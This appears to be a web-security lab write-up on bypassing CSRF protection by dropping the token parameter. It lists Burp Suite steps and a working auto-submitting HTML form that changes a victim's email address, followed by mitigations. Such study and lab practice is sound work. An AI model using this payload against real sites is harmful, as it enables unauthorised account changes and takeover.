# Lab Name
CSRF where token validation depends on token being present

## Vulnerability
Cross-Site Request Forgery (CSRF) – Token Presence Validation Bypass

## Objective
Exploit a CSRF vulnerability by removing the CSRF token parameter and change the victim's email address.

## Entry Point
Change Email functionality

## Exploitation Type
Cross-Site Request Forgery (CSRF)

## Methodology
1. Open the lab and log in using the provided credentials

2. Navigate to the "My Account" page

3. Change the email address and intercept the request using Burp Suite

4. Observe that the request contains a CSRF token

5. Remove the CSRF token parameter completely from the request

6. Send the modified request and verify that the email address is updated successfully

7. Generate a CSRF PoC using Burp Suite

8. Upload the generated HTML to the Exploit Server

9. Deliver the exploit to the victim

10. When the victim visits the malicious page, the forged request is submitted without a CSRF token and the email address is changed successfully, solving the lab

## Payload Used

```html
<html>
  <body>
    <form action="https://0a020046034458918004033e0012007b.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="attacker@example.com">
    </form>

    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

## Result
Successfully bypassed the CSRF protection by omitting the CSRF token parameter and changed the victim's email address.

## Impact
- Unauthorized account modifications
- Account takeover opportunities
- User impersonation
- Sensitive information changes
- Bypass of security controls

## Mitigation
- Always require a valid CSRF token for every state-changing request
- Reject requests with missing or invalid CSRF tokens
- Validate Origin and Referer headers
- Use SameSite cookies
- Perform server-side validation for all sensitive actions

## Learning
Checking a CSRF token only when it is present is an insecure implementation.
Applications should reject any state-changing request that does not contain a valid CSRF token, rather than accepting requests with the token omitted.
